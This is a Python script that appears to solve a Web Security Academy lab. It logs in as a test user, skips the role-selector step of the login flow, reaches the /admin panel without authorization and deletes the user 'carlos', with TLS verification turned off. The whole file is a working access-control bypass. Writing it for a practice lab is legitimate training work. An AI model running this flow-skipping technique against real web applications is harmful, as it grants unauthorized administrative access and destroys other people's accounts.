import re
import sys
import requests
import urllib3
from bs4 import BeautifulSoup
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf(session: requests.Session, url: str) -> str:
    r = session.get(url, verify=False)
    r.raise_for_status()
    soup = BeautifulSoup(r.text, "html.parser")
    inp = soup.find("input", {"name": "csrf"})
    if not inp or not inp.get("value"):
        raise RuntimeError(f"CSRF not found on {url}")
    return inp["value"]

def login_and_skip_role_selector(session: requests.Session, base: str) -> None:
    login_url = urljoin(base, "/login")
    csrf = get_csrf(session, login_url)

    data = {"csrf": csrf, "username": "wiener", "password": "peter"}

    r = session.post(login_url, data=data, verify=False, allow_redirects=False)
    r.raise_for_status()

    loc = r.headers.get("Location", "")
    print("[dbg] login status:", r.status_code, "location:", loc, "cookies:", session.cookies.get_dict())

    # If the app redirects somewhere else first, follow it ONCE to get any state cookies,
    # but still skip /role-selector specifically.
    if loc and "role-selector" not in loc:
        nxt = urljoin(base, loc)
        r2 = session.get(nxt, verify=False, allow_redirects=False)
        print("[dbg] followed redirect once:", r2.status_code, "location:", r2.headers.get("Location", ""),
              "cookies:", session.cookies.get_dict())

def find_delete_carlos(admin_html: str) -> str | None:
    soup = BeautifulSoup(admin_html, "html.parser")
    for a in soup.find_all("a", href=True):
        href = a["href"]
        if "carlos" in href and "delete" in href:
            return href
    return None

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} https://<lab-id>.web-security-academy.net")
        sys.exit(1)

    base = sys.argv[1].rstrip("/")
    s = requests.Session()

    login_and_skip_role_selector(s, base)

    admin_url = urljoin(base, "/admin")
    admin = s.get(admin_url, verify=False, allow_redirects=True)

    print("[dbg] /admin status:", admin.status_code, "final url:", admin.url)

    if admin.status_code == 401:
        print("[-] Still unauthorized for /admin. The instance may require a different skipped step.")
        print("    Check the debug lines above: what is the Location after login?")
        sys.exit(1)

    admin.raise_for_status()

    delete_path = find_delete_carlos(admin.text)
    if not delete_path:
        print("[-] Can't find delete link for carlos.")
        sys.exit(1)

    del_url = urljoin(base, delete_path)
    r = s.get(del_url, verify=False, allow_redirects=True)
    r.raise_for_status()

    home = s.get(urljoin(base, "/"), verify=False)
    if "Congratulations" in (r.text + home.text):
        print("[+] Solved (carlos deleted).")
    else:
        print("[?] Delete request sent; check the lab page.")

if __name__ == "__main__":
    main()
